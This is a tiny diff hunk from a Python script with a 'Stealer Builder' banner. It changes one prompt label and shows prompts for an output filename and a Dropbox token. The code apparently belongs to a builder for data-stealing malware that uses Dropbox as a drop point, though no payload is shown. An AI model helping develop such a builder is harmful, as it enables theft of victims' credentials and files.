@@ -157,7 +157,7 @@ while True:
 #    Stealer Builder    #
 #########################
 ''')
-      print('Input filename:')
+      print('Output filename:')
       name = input()
       print('Input dropbox token:')
       kay = input()
